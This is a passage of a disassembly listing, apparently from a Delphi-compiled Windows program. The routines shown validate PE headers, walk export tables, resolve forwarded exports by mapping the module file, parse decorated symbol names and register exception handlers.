; ---------------------------------------------------------------------------

loc_406766:				; CODE XREF: sub_4066FC+4Dj
		push	104h		; nSize
		lea	eax, [esp+340h+var_216]
		push	eax		; lpFilename
		mov	eax, [esp+344h+Buffer.AllocationBase]
		push	eax		; hModule
		call	GetModuleFileNameW
		test	eax, eax
		setnz	bl

loc_406782:				; CODE XREF: sub_4066FC+68j
		test	bl, bl
		jz	short loc_4067C8
		mov	eax, [esp+33Ch+Buffer.AllocationBase]
		mov	[esi], eax
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_4067B7
		mov	edi, 104h
		lea	eax, [esp+33Ch+var_216]
		lea	esi, [esp+33Ch+Filename]

loc_4067A8:				; CODE XREF: sub_4066FC+B9j
		mov	dl, [eax]
		mov	[esi], dl
		test	dl, dl
		jz	short loc_4067B7
		inc	esi
		add	eax, 2
		dec	edi
		jnz	short loc_4067A8

loc_4067B7:				; CODE XREF: sub_4066FC+9Aj
					; sub_4066FC+B2j
		mov	eax, [esp+33Ch+var_33C]
		lea	edx, [esp+33Ch+Filename]
		mov	ecx, 105h
		call	sub_403BF8

loc_4067C8:				; CODE XREF: sub_4066FC+3Dj
					; sub_4066FC+88j
		mov	eax, ebx
		add	esp, 330h
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4066FC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4067D4	proc near		; CODE XREF: sub_406830+8p
					; sub_40685C+24p ...
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	esi, eax
		xor	ebx, ebx
		xor	eax, eax
		push	ebp
		push	offset loc_40681C
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		push	2		; ucb
		mov	edi, esi
		push	edi		; lp
		call	IsBadReadPtr
		test	eax, eax
		jnz	short loc_406812
		cmp	word ptr [edi],	5A4Dh
		jnz	short loc_406812
		lea	eax, [esi+3Ch]
		mov	ebx, [eax]
		add	ebx, esi
		cmp	dword ptr [ebx], 4550h
		jz	short loc_406812
		xor	ebx, ebx

loc_406812:				; CODE XREF: sub_4067D4+24j
					; sub_4067D4+2Bj ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_406828
; ---------------------------------------------------------------------------

loc_40681C:				; DATA XREF: sub_4067D4+Do
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	ebx, ebx
		call	sub_4033E8

loc_406828:				; CODE XREF: sub_4067D4+46j
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_4067D4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_406830	proc near		; CODE XREF: sub_406854+2p
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		mov	eax, ebx
		call	sub_4067D4
		test	eax, eax
		jz	short loc_40684B
		mov	esi, [eax+esi*8+78h]
		add	esi, ebx
		mov	edx, esi
		jmp	short loc_40684D
; ---------------------------------------------------------------------------

loc_40684B:				; CODE XREF: sub_406830+Fj
		xor	edx, edx

loc_40684D:				; CODE XREF: sub_406830+19j
		mov	eax, edx
		pop	esi
		pop	ebx
		retn
sub_406830	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_406854	proc near		; CODE XREF: sub_406B50+Bp
					; sub_406B9C+30p ...
		xor	edx, edx
		call	sub_406830
		retn
sub_406854	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40685C	proc near		; CODE XREF: sub_406960+193p
					; sub_406B50+30p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		push	esi
		xor	ecx, ecx
		mov	[ebp+var_10], ecx
		mov	[ebp+var_C], ecx
		mov	ebx, edx
		mov	esi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_4068FB
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, esi
		call	sub_4067D4
		mov	edx, [eax+78h]
		mov	[ebp+var_8], edx
		mov	edx, [eax+7Ch]
		mov	[ebp+var_4], edx
		mov	eax, [ebp+var_8]
		cmp	ebx, eax
		jb	short loc_4068DE
		add	eax, [ebp+var_4]
		cmp	ebx, eax
		jnb	short loc_4068DE
		lea	eax, [ebp+var_C]
		lea	edx, [ebx+esi]
		call	sub_403B8C
		mov	eax, [ebp+var_C]
		call	sub_403E24
		mov	esi, eax
		mov	ebx, esi

loc_4068B6:				; CODE XREF: sub_40685C+5Ej
		inc	ebx
		cmp	byte ptr [ebx],	2Eh
		jnz	short loc_4068B6
		mov	byte ptr [ebx],	0
		inc	ebx
		push	esi		; lpModuleName
		call	GetModuleHandleA_0
		push	eax
		lea	eax, [ebp+var_10]
		mov	edx, ebx
		call	sub_403B8C
		mov	edx, [ebp+var_10]
		pop	eax
		call	sub_406960
		mov	ebx, eax
		jmp	short loc_4068E0
; ---------------------------------------------------------------------------

loc_4068DE:				; CODE XREF: sub_40685C+3Aj
					; sub_40685C+41j
		add	ebx, esi

loc_4068E0:				; CODE XREF: sub_40685C+80j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_406902

loc_4068ED:				; CODE XREF: sub_40685C+A4j
		lea	eax, [ebp+var_10]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_4068FB:				; DATA XREF: sub_40685C+17o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4068ED
; ---------------------------------------------------------------------------

loc_406902:				; CODE XREF: sub_40685C+9Ej
					; DATA XREF: sub_40685C+8Co
		mov	eax, ebx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40685C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40690C	proc near		; CODE XREF: sub_406960+143p
					; sub_406960+153p
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	edi, edx
		mov	ecx, eax
		add	ecx, 0F8h
		mov	esi, ecx
		movzx	ebp, word ptr [eax+6]
		dec	ebp
		test	ebp, ebp
		jl	short loc_406956
		inc	ebp
		xor	ecx, ecx

loc_406928:				; CODE XREF: sub_40690C+48j
		lea	ebx, [ecx+ecx*4]
		cmp	edx, [esi+ebx*8+0Ch]
		jb	short loc_406952
		movzx	ebx, word ptr [eax+6]
		dec	ebx
		cmp	ecx, ebx
		jz	short loc_406943
		lea	ebx, [ecx+ecx*4]
		cmp	edx, [esi+ebx*8+34h]
		jnb	short loc_406952

loc_406943:				; CODE XREF: sub_40690C+2Cj
		lea	eax, [ecx+ecx*4]
		mov	edi, edx
		sub	edi, [esi+eax*8+0Ch]
		add	edi, [esi+eax*8+14h]
		jmp	short loc_406956
; ---------------------------------------------------------------------------

loc_406952:				; CODE XREF: sub_40690C+23j
					; sub_40690C+35j
		inc	ecx
		dec	ebp
		jnz	short loc_406928

loc_406956:				; CODE XREF: sub_40690C+17j
					; sub_40690C+44j
		mov	eax, edi
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40690C	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_406960	proc near		; CODE XREF: sub_40685C+79p
					; sub_409880+3Ap ...

var_12C		= dword	ptr -12Ch
FileName	= byte ptr -125h
var_20		= dword	ptr -20h
lpBaseAddress	= dword	ptr -1Ch
hObject		= dword	ptr -18h
hFile		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFED4h
		push	ebx
		push	esi
		push	edi
		xor	ecx, ecx
		mov	[ebp+var_12C], ecx
		mov	[ebp+var_4], edx
		mov	ebx, eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_406B3E
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	esi, esi
		test	ebx, ebx
		jz	loc_406B1D
		mov	eax, ebx
		call	sub_4067D4
		mov	[ebp+var_8], eax
		cmp	[ebp+var_8], 0
		jz	loc_406B08
		mov	eax, [ebp+var_8]
		mov	eax, [eax+78h]
		mov	[ebp+var_10], eax
		mov	eax, [ebp+var_10]
		add	eax, ebx
		mov	edi, eax
		test	edi, edi
		jz	loc_406B08
		mov	eax, [edi+18h]
		dec	eax
		test	eax, eax
		jl	loc_406B08
		inc	eax
		mov	[ebp+var_20], eax
		mov	[ebp+var_C], 0

loc_4069DC:				; CODE XREF: sub_406960+1A2j
		lea	eax, [ebp+var_12C]
		mov	edx, [edi+20h]
		add	edx, ebx
		mov	ecx, [ebp+var_C]
		mov	edx, [edx+ecx*4]
		add	edx, ebx
		call	sub_403B8C
		mov	eax, [ebp+var_12C]
		mov	edx, [ebp+var_4]
		call	sub_403D70
		jnz	loc_406AFC
		mov	eax, [edi+24h]
		add	eax, ebx
		mov	edx, [ebp+var_C]
		mov	si, [eax+edx*2]
		movzx	eax, si
		mov	edx, [edi+1Ch]
		add	edx, ebx
		mov	edi, [edx+eax*4]
		mov	eax, [ebp+var_8]
		cmp	edi, [eax+50h]
		jbe	loc_406AEF
		xor	edi, edi
		push	104h		; nSize
		lea	eax, [ebp+FileName]
		push	eax		; lpFilename
		push	ebx		; hModule
		call	GetModuleFileNameA_0
		push	0		; hTemplateFile
		push	0		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	1		; dwShareMode
		push	80000000h	; dwDesiredAccess
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	CreateFileA
		mov	[ebp+hFile], eax
		cmp	[ebp+hFile], 0FFFFFFFFh
		jz	loc_406AEF
		push	0		; lpName
		push	0		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	2		; flProtect
		push	0		; lpFileMappingAttributes
		mov	eax, [ebp+hFile]
		push	eax		; hFile
		call	CreateFileMappingA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0
		jz	short loc_406AE6
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	4		; dwDesiredAccess
		mov	eax, [ebp+hObject]
		push	eax		; hFileMappingObject
		call	MapViewOfFile
		mov	[ebp+lpBaseAddress], eax
		cmp	[ebp+lpBaseAddress], 0
		jz	short loc_406ADD
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_8]
		call	sub_40690C
		add	eax, [ebp+lpBaseAddress]
		mov	edi, eax
		mov	edx, [edi+1Ch]
		mov	eax, [ebp+var_8]
		call	sub_40690C
		add	eax, [ebp+lpBaseAddress]
		movzx	edx, si
		mov	edi, [eax+edx*4]
		mov	eax, [ebp+lpBaseAddress]
		push	eax		; lpBaseAddress
		call	UnmapViewOfFile
		push	104h		; nSize
		lea	eax, [ebp+FileName]
		push	eax		; lpFilename
		push	0		; hModule
		call	GetModuleFileNameA_0

loc_406ADD:				; CODE XREF: sub_406960+13Bj
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_406AE6:				; CODE XREF: sub_406960+121j
		mov	eax, [ebp+hFile]
		push	eax		; hObject
		call	CloseHandle

loc_406AEF:				; CODE XREF: sub_406960+C5j
					; sub_406960+101j
		mov	edx, edi
		mov	eax, ebx
		call	sub_40685C
		mov	esi, eax
		jmp	short loc_406B08
; ---------------------------------------------------------------------------

loc_406AFC:				; CODE XREF: sub_406960+A2j
		inc	[ebp+var_C]
		dec	[ebp+var_20]
		jnz	loc_4069DC

loc_406B08:				; CODE XREF: sub_406960+47j
					; sub_406960+5Fj ...
		test	esi, esi
		jnz	short loc_406B1D
		mov	eax, [ebp+var_4]
		call	sub_403E24
		push	eax		; lpProcName
		push	ebx		; hModule
		call	GetProcAddress_0
		mov	esi, eax

loc_406B1D:				; CODE XREF: sub_406960+33j
					; sub_406960+1AAj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_406B45

loc_406B2A:				; CODE XREF: sub_406960+1E3j
		lea	eax, [ebp+var_12C]
		call	sub_403994
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_406B3E:				; DATA XREF: sub_406960+24o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406B2A
; ---------------------------------------------------------------------------

loc_406B45:				; CODE XREF: sub_406960+1DDj
					; DATA XREF: sub_406960+1C5o
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_406960	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_406B50	proc near		; CODE XREF: sub_40A6B0+53p
					; sub_40A6B0+64p ...
		push	ebx
		push	esi
		push	edi
		mov	esi, edx
		mov	edi, eax
		xor	ebx, ebx
		mov	eax, edi
		call	sub_406854
		test	eax, eax
		jz	short loc_406B87
		sub	esi, [eax+10h]
		test	esi, esi
		jl	short loc_406B87
		cmp	esi, [eax+14h]
		jge	short loc_406B87
		mov	eax, [eax+1Ch]
		add	eax, edi
		mov	eax, [eax+esi*4]
		test	eax, eax
		jbe	short loc_406B87
		mov	edx, eax
		mov	eax, edi
		call	sub_40685C
		mov	ebx, eax

loc_406B87:				; CODE XREF: sub_406B50+12j
					; sub_406B50+19j ...
		test	ebx, ebx
		jnz	short loc_406B94
		push	esi		; lpProcName
		push	edi		; hModule
		call	GetProcAddress_0
		mov	ebx, eax

loc_406B94:				; CODE XREF: sub_406B50+39j
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_406B50	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_406B9C	proc near		; CODE XREF: sub_408888+324p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_10], ebx
		mov	[ebp+var_C], ebx
		mov	[ebp+var_1], cl
		mov	edi, edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_406CB1
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+arg_0]
		call	sub_403994
		mov	eax, ebx
		call	sub_406854
		test	eax, eax
		jz	loc_406C67
		mov	esi, eax
		mov	eax, [esi+14h]
		dec	eax
		test	eax, eax
		jl	loc_406C67
		inc	eax
		mov	[ebp+var_8], 0

loc_406BEF:				; CODE XREF: sub_406B9C+C9j
		mov	edx, [esi+1Ch]
		add	edx, ebx
		mov	ecx, [ebp+var_8]
		mov	edx, [edx+ecx*4]
		add	edx, ebx
		cmp	edx, edi
		jnz	short loc_406C61
		mov	eax, [esi+18h]
		dec	eax
		test	eax, eax
		jl	short loc_406C31
		inc	eax
		xor	edi, edi

loc_406C0B:				; CODE XREF: sub_406B9C+93j
		mov	edx, [esi+24h]
		add	edx, ebx
		movzx	edx, word ptr [edx+edi*2]
		cmp	edx, [ebp+var_8]
		jnz	short loc_406C2D
		mov	eax, [ebp+arg_0]
		mov	edx, [esi+20h]
		add	edx, ebx
		mov	edx, [edx+edi*4]
		add	edx, ebx
		call	sub_403B8C
		jmp	short loc_406C31
; ---------------------------------------------------------------------------

loc_406C2D:				; CODE XREF: sub_406B9C+7Bj
		inc	edi
		dec	eax
		jnz	short loc_406C0B

loc_406C31:				; CODE XREF: sub_406B9C+6Aj
					; sub_406B9C+8Fj
		mov	eax, [ebp+arg_0]
		cmp	dword ptr [eax], 0
		jnz	short loc_406C67
		lea	eax, [ebp+var_10]
		push	eax
		mov	eax, [esi+10h]
		add	eax, [ebp+var_8]
		mov	cl, 30h
		mov	edx, 1
		call	sub_40618C
		mov	ecx, [ebp+var_10]
		mov	eax, [ebp+arg_0]
		mov	edx, offset dword_406CCC
		call	sub_403C70
		jmp	short loc_406C67
; ---------------------------------------------------------------------------

loc_406C61:				; CODE XREF: sub_406B9C+62j
		inc	[ebp+var_8]
		dec	eax
		jnz	short loc_406BEF

loc_406C67:				; CODE XREF: sub_406B9C+37j
					; sub_406B9C+45j ...
		cmp	[ebp+var_1], 0
		jz	short loc_406C96
		lea	edx, [ebp+var_C]
		mov	eax, [ebp+arg_0]
		call	sub_406CDC
		test	al, al
		jz	short loc_406C96
		push	[ebp+var_C]
		push	offset dword_406CD8
		mov	eax, [ebp+arg_0]
		push	dword ptr [eax]
		mov	eax, [ebp+arg_0]
		mov	edx, 3
		call	sub_403CE4

loc_406C96:				; CODE XREF: sub_406B9C+CFj
					; sub_406B9C+DEj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_406CB8

loc_406CA3:				; CODE XREF: sub_406B9C+11Aj
		lea	eax, [ebp+var_10]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_406CB1:				; DATA XREF: sub_406B9C+1Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406CA3
; ---------------------------------------------------------------------------

loc_406CB8:				; CODE XREF: sub_406B9C+114j
					; DATA XREF: sub_406B9C+102o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_406B9C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 1
dword_406CCC	dd 23h,	0FFFFFFFFh, 1	; DATA XREF: sub_406B9C+B9o
dword_406CD8	dd 2Eh			; DATA XREF: sub_406B9C+E3o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_406CDC	proc near		; CODE XREF: sub_406B9C+D7p

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_E		= byte ptr -0Eh
var_D		= byte ptr -0Dh
var_C		= dword	ptr -0Ch
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE8h
		push	ebx
		push	esi
		push	edi
		xor	ecx, ecx
		mov	[ebp+var_18], ecx
		mov	[ebp+var_14], ecx
		mov	[ebp+var_4], edx
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_406F8D
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+var_5], 0
		mov	eax, [ebp+var_4]
		call	sub_403994
		push	0
		mov	eax, ebx
		mov	ecx, offset dword_406FA8
		mov	edx, offset dword_406FB4
		call	sub_405908
		cmp	dword ptr [ebx], 0
		jz	loc_406F72
		mov	eax, [ebx]
		cmp	byte ptr [eax],	40h
		jnz	loc_406F72
		lea	eax, [ebp+var_14]
		call	sub_403994
		mov	eax, [ebx]
		call	sub_403C24
		dec	eax
		jle	short loc_406D98
		mov	eax, [ebx]
		cmp	byte ptr [eax+1], 25h
		jnz	short loc_406D98
		mov	eax, [ebx]
		call	sub_403C24
		mov	esi, eax
		dec	esi
		cmp	esi, 3
		jl	short loc_406D98

loc_406D5C:				; CODE XREF: sub_406CDC+BAj
		mov	eax, [ebx]
		cmp	byte ptr [eax+esi-1], 25h
		jnz	short loc_406D92
		mov	eax, [ebx]
		cmp	byte ptr [eax+esi], 40h
		jnz	short loc_406D92
		lea	eax, [ebp+var_18]
		push	eax
		lea	edx, [esi+2]
		mov	eax, [ebx]
		mov	ecx, 7FFFFFFFh
		call	sub_403E84
		mov	ecx, [ebp+var_18]
		lea	eax, [ebp+var_14]
		mov	edx, offset dword_406FA8
		call	sub_403C70
		jmp	short loc_406D98
; ---------------------------------------------------------------------------

loc_406D92:				; CODE XREF: sub_406CDC+87j
					; sub_406CDC+8Fj
		dec	esi
		cmp	esi, 2
		jnz	short loc_406D5C

loc_406D98:				; CODE XREF: sub_406CDC+67j
					; sub_406CDC+6Fj ...
		mov	[ebp+var_C], 3
		mov	eax, [ebx]
		call	sub_403C24
		cmp	eax, 6
		jle	short loc_406DED
		mov	eax, [ebx]
		cmp	byte ptr [eax+1], 5Fh
		jnz	short loc_406DED
		mov	eax, [ebx]
		cmp	byte ptr [eax+2], 24h
		jnz	short loc_406DED
		mov	eax, [ebx]
		call	sub_403C24
		mov	edi, eax
		dec	edi
		sub	edi, 5
		jl	short loc_406DED
		inc	edi
		mov	esi, 5

loc_406DD0:				; CODE XREF: sub_406CDC+10Fj
		mov	eax, [ebx]
		cmp	byte ptr [eax+esi-1], 24h
		jnz	short loc_406DE9
		mov	eax, [ebx]
		cmp	byte ptr [eax+esi], 40h
		jnz	short loc_406DED
		lea	eax, [esi+1]
		mov	[ebp+var_C], eax
		jmp	short loc_406DED
; ---------------------------------------------------------------------------

loc_406DE9:				; CODE XREF: sub_406CDC+FBj
		inc	esi
		dec	edi
		jnz	short loc_406DD0

loc_406DED:				; CODE XREF: sub_406CDC+CDj
					; sub_406CDC+D5j ...
		mov	[ebp+var_D], 0
		mov	[ebp+var_E], 0
		mov	esi, [ebp+var_C]
		mov	eax, [ebx]
		call	sub_403C24
		mov	edi, eax
		sub	edi, esi
		jl	short loc_406E81
		inc	edi

loc_406E06:				; CODE XREF: sub_406CDC+1A3j
		mov	eax, [ebx]
		mov	al, [eax+esi-1]
		sub	al, 24h
		jz	short loc_406E16
		sub	al, 1Ch
		jz	short loc_406E54
		jmp	short loc_406E7D
; ---------------------------------------------------------------------------

loc_406E16:				; CODE XREF: sub_406CDC+132j
		mov	eax, [ebx]
		call	sub_403C24
		lea	edx, [esi+1]
		cmp	eax, edx
		jle	short loc_406E2D
		mov	eax, [ebx]
		cmp	byte ptr [eax+esi+1], 64h
		jz	short loc_406E31

loc_406E2D:				; CODE XREF: sub_406CDC+146j
		xor	eax, eax
		jmp	short loc_406E33
; ---------------------------------------------------------------------------

loc_406E31:				; CODE XREF: sub_406CDC+14Fj
		mov	al, 1

loc_406E33:				; CODE XREF: sub_406CDC+153j
		mov	[ebp+var_D], al
		mov	eax, ebx
		mov	ecx, 7FFFFFFFh
		mov	edx, esi
		call	sub_403EC4
		mov	eax, ebx
		mov	edx, [ebp+var_14]
		call	sub_403C2C
		mov	[ebp+var_E], 1
		jmp	short loc_406E81
; ---------------------------------------------------------------------------

loc_406E54:				; CODE XREF: sub_406CDC+136j
		mov	eax, ebx
		call	sub_403E7C
		mov	byte ptr [eax+esi-1], 2Eh
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax], 0
		jnz	short loc_406E7D
		mov	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		sub	ecx, 2
		mov	eax, [ebx]
		mov	edx, 2
		call	sub_403E84

loc_406E7D:				; CODE XREF: sub_406CDC+138j
					; sub_406CDC+18Aj
		inc	esi
		dec	edi
		jnz	short loc_406E06

loc_406E81:				; CODE XREF: sub_406CDC+127j
					; sub_406CDC+176j
		mov	eax, [ebp+var_4]
		cmp	dword ptr [eax], 0
		jz	short loc_406ECC
		mov	eax, [ebp+var_4]
		mov	eax, [eax]
		call	sub_403C24
		mov	esi, eax
		add	esi, 2
		mov	eax, [ebx]
		call	sub_403C24
		cmp	esi, eax
		jge	short loc_406EC4
		mov	eax, [ebp+var_4]
		mov	eax, [eax]
		call	sub_403C24
		mov	ecx, eax
		add	ecx, 2
		mov	eax, ebx
		mov	edx, 1
		call	sub_403EC4
		mov	[ebp+var_E], 0
		jmp	short loc_406ECC
; ---------------------------------------------------------------------------

loc_406EC4:				; CODE XREF: sub_406CDC+1C5j
		mov	eax, [ebp+var_4]
		call	sub_403994

loc_406ECC:				; CODE XREF: sub_406CDC+1ABj
					; sub_406CDC+1E6j
		cmp	[ebp+var_E], 0
		jz	short loc_406EE3
		mov	eax, ebx
		mov	ecx, 1
		mov	edx, 1
		call	sub_403EC4

loc_406EE3:				; CODE XREF: sub_406CDC+1F4j
		cmp	dword ptr [ebx], 0
		jz	short loc_406F11
		mov	eax, [ebx]
		mov	al, [eax]
		cmp	al, 25h
		jnz	short loc_406F03
		mov	eax, ebx
		mov	ecx, 1
		mov	edx, 1
		call	sub_403EC4
		jmp	short loc_406F11
; ---------------------------------------------------------------------------

loc_406F03:				; CODE XREF: sub_406CDC+212j
		cmp	al, 2Eh
		jnz	short loc_406F11
		mov	eax, ebx
		call	sub_403E7C
		mov	byte ptr [eax],	40h

loc_406F11:				; CODE XREF: sub_406CDC+20Aj
					; sub_406CDC+225j ...
		cmp	dword ptr [ebx], 0
		jz	short loc_406F46
		mov	eax, [ebx]
		call	sub_403C24
		mov	edx, [ebx]
		cmp	byte ptr [edx+eax-1], 2Eh
		jnz	short loc_406F46
		cmp	[ebp+var_D], 0
		jz	short loc_406F3A
		mov	eax, ebx
		mov	edx, offset aDestroy ; "Destroy"
		call	sub_403C2C
		jmp	short loc_406F46
; ---------------------------------------------------------------------------

loc_406F3A:				; CODE XREF: sub_406CDC+24Ej
		mov	eax, ebx
		mov	edx, offset aCreate ; "Create"
		call	sub_403C2C

loc_406F46:				; CODE XREF: sub_406CDC+238j
					; sub_406CDC+248j ...
		mov	eax, ebx
		call	sub_4055D4
		cmp	dword ptr [ebx], 0
		jz	short loc_406F6E
		mov	eax, [ebx]
		call	sub_403C24
		mov	edx, [ebx]
		cmp	byte ptr [edx+eax-1], 2Eh
		jnz	short loc_406F6E
		mov	eax, ebx
		mov	edx, offset dword_406FE0
		call	sub_403C2C

loc_406F6E:				; CODE XREF: sub_406CDC+274j
					; sub_406CDC+284j
		mov	[ebp+var_5], 1

loc_406F72:				; CODE XREF: sub_406CDC+46j
					; sub_406CDC+51j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_406F94

loc_406F7F:				; CODE XREF: sub_406CDC+2B6j
		lea	eax, [ebp+var_18]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_406F8D:				; DATA XREF: sub_406CDC+19o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_406F7F
; ---------------------------------------------------------------------------

loc_406F94:				; CODE XREF: sub_406CDC+2B0j
					; DATA XREF: sub_406CDC+29Eo
		mov	al, [ebp+var_5]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_406CDC	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 1
dword_406FA8	dd 2Eh,	0FFFFFFFFh, 2	; DATA XREF: sub_406CDC+34o
					; sub_406CDC+AAo
dword_406FB4	dd 3A3Ah, 0FFFFFFFFh, 7	; DATA XREF: sub_406CDC+39o
aDestroy	db 'Destroy',0          ; DATA XREF: sub_406CDC+252o
		dd 0FFFFFFFFh, 6
aCreate		db 'Create',0           ; DATA XREF: sub_406CDC+260o
		align 4
		dd 0FFFFFFFFh, 1
dword_406FE0	dd 3Fh			; DATA XREF: sub_406CDC+288o
; ---------------------------------------------------------------------------

loc_406FE4:				; DATA XREF: sub_407058+1Co
		mov	ecx, offset aUnknownExcepti ; "Unknown exception. If you want to know "...
		mov	dl, 1
		mov	eax, off_4054BC
		call	sub_405528
		retn
; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 56h
aUnknownExcepti	db 'Unknown exception. If you want to know more, you have to add SysU'
					; DATA XREF: CODE:loc_406FE4o
		db 'tils to your project.',0
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_407058	proc near		; CODE XREF: sub_411A80+8p
		mov	eax, ds:off_416D54
		cmp	dword ptr [eax], 0
		jnz	short locret_40707A
		mov	eax, ds:off_416D54
		mov	edx, off_4054BC
		mov	[eax], edx
		mov	eax, ds:off_416D94
		mov	dword ptr [eax], offset	loc_406FE4

locret_40707A:				; CODE XREF: sub_407058+8j
		retn
sub_407058	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40707C	proc near		; DATA XREF: CODE:00415BB8o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_4070C8
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417684
		jnz	short loc_4070BA
		call	sub_4066E4
		mov	eax, offset dword_4176A8
		mov	edx, off_4066C0
		call	sub_404724
		mov	eax, offset dword_417688
		mov	edx, off_406658
		call	sub_40409C

loc_4070BA:				; CODE XREF: sub_40707C+17j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4070CF

loc_4070C7:				; CODE XREF: sub_40707C+51j
		retn
; ---------------------------------------------------------------------------

loc_4070C8:				; DATA XREF: sub_40707C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4070C7
; ---------------------------------------------------------------------------

loc_4070CF:				; CODE XREF: sub_40707C:loc_4070C7j
					; DATA XREF: sub_40707C+46o
		pop	ebp
		retn
sub_40707C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4070D4	proc near		; DATA XREF: CODE:00415BB4o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_4070FA
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		sub	ds:dword_417684, 1
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_407101

loc_4070F9:				; CODE XREF: sub_4070D4+2Bj
		retn
; ---------------------------------------------------------------------------

